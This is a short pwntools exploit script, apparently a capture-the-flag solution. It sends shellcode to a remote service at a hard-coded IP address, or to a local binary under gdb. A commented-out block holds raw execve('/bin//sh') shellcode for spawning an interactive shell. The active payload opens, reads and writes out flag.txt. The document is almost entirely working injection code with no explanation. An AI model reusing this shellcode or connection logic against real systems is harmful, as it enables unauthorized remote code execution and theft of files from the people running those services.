from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
gs = "continue"

"""first chall
sc = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
r = remote('51.83.41.99', 5003)
sleep(.5)
r.sendline(sc)
r.interactive()
"""
if not args.LOCAL:
    io = remote('51.83.41.99', 5004)
else:
    io = process('./shellcode2')
    gdb.attach(io, gdbscript=gs)
    pause()


sc = asm(shellcraft.amd64.open("flag.txt", mode=constants.O_RDWR), arch='amd64')
sc += asm('mov rdi,rax', arch='amd64')
sc += asm('push 40', arch='amd64')
sc += asm('pop rdx; mov rsi,rsp; xor rax,rax; syscall', arch='amd64')
sc += asm('push 2; pop rdi; mov rax,1; syscall', arch='amd64')
sleep(.5)
io.send(sc)

io.interactive()
